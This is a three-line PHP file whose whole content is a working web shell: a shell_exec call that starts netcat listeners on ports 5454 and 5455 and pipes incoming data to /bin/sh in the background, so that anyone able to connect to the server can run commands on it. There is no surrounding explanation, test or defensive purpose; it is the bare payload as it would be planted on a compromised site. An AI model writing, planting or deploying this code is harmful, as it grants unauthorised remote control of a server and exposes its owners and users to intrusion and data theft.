<?php
shell_exec("(nc -l 5454 | /bin/sh | nc -l 5455)&");
?>
